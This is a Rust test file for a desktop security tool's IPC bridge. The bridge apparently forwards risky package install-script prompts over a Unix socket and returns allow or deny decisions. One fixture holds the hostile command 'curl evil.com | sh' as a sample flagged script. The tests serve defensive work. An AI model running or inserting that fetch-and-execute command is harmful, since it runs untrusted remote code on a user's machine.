#![cfg(unix)]

use std::sync::{Arc, Mutex};

use ripley_desktop_lib::ipc_bridge::{self, GuardEventPayload};
use ripley_ipc::protocol::{GuardDecision, GuardPromptData, Request, Response};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixStream;
use tokio_util::sync::CancellationToken;

#[tokio::test]
async fn bridge_round_trip_allow() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let socket_path = tmp.path().join("ripley.sock");
    let pending = ipc_bridge::new_pending();
    let latencies = ipc_bridge::new_latency_map();

    let captured: Arc<Mutex<Vec<GuardEventPayload>>> = Arc::new(Mutex::new(Vec::new()));
    let captured_for_emit = captured.clone();
    let emit = move |payload: GuardEventPayload| {
        captured_for_emit
            .lock()
            .expect("captured lock")
            .push(payload);
    };

    let cancel = CancellationToken::new();
    let serve_pending = pending.clone();
    let serve_latencies = latencies.clone();
    let serve_path = socket_path.clone();
    let serve_cancel = cancel.clone();
    let serve_handle = tokio::spawn(async move {
        ipc_bridge::serve(
            &serve_path,
            serve_pending,
            serve_latencies,
            emit,
            serve_cancel,
        )
        .await
        .expect("serve");
    });

    wait_for_socket(&socket_path).await;

    let mut client = UnixStream::connect(&socket_path).await.expect("connect");
    let prompt = GuardPromptData {
        package: "evil-pkg".into(),
        version: "1.0.0".into(),
        script: "curl evil.com | sh".into(),
        risk_level: "high".into(),
        matched_rules: vec!["NET001".into()],
    };
    let req = Request::GuardPrompt(prompt.clone());
    let mut payload = serde_json::to_string(&req).expect("serialize");
    payload.push('\n');
    client.write_all(payload.as_bytes()).await.expect("write");

    let id = wait_for_event(&captured).await;
    assert!(id.starts_with("guard-"));

    assert!(
        latencies.lock().await.contains_key(&id),
        "latency start should be recorded on event_received"
    );

    let tx = pending
        .lock()
        .await
        .remove(&id)
        .expect("pending entry exists");
    tx.send(GuardDecision::Allow).expect("send decision");

    let (reader, _writer) = client.split();
    let mut buf = BufReader::new(reader);
    let mut line = String::new();
    buf.read_line(&mut line).await.expect("read response");
    let resp: Response = serde_json::from_str(line.trim()).expect("parse response");
    match resp {
        Response::GuardDecision(GuardDecision::Allow) => {}
        other => panic!("unexpected response: {other:?}"),
    }

    cancel.cancel();
    serve_handle.await.expect("serve task");
}

#[tokio::test]
async fn bridge_rejects_unsupported_request() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let socket_path = tmp.path().join("ripley.sock");
    let pending = ipc_bridge::new_pending();
    let latencies = ipc_bridge::new_latency_map();

    let emit = |_payload: GuardEventPayload| {};
    let cancel = CancellationToken::new();
    let serve_path = socket_path.clone();
    let serve_cancel = cancel.clone();
    let serve_handle = tokio::spawn(async move {
        ipc_bridge::serve(&serve_path, pending, latencies, emit, serve_cancel)
            .await
            .expect("serve");
    });

    wait_for_socket(&socket_path).await;

    let mut client = UnixStream::connect(&socket_path).await.expect("connect");
    let req = Request::Status;
    let mut payload = serde_json::to_string(&req).expect("serialize");
    payload.push('\n');
    client.write_all(payload.as_bytes()).await.expect("write");

    let (reader, _writer) = client.split();
    let mut buf = BufReader::new(reader);
    let mut line = String::new();
    buf.read_line(&mut line).await.expect("read response");
    let resp: Response = serde_json::from_str(line.trim()).expect("parse response");
    assert!(matches!(resp, Response::Error(_)));

    cancel.cancel();
    serve_handle.await.expect("serve task");
}

async fn wait_for_socket(path: &std::path::Path) {
    for _ in 0..50 {
        if path.exists() {
            return;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    panic!("socket never appeared at {path:?}");
}

async fn wait_for_event(captured: &Arc<Mutex<Vec<GuardEventPayload>>>) -> String {
    for _ in 0..100 {
        if let Some(payload) = captured.lock().expect("captured lock").first() {
            return payload.id.clone();
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    panic!("no event captured");
}
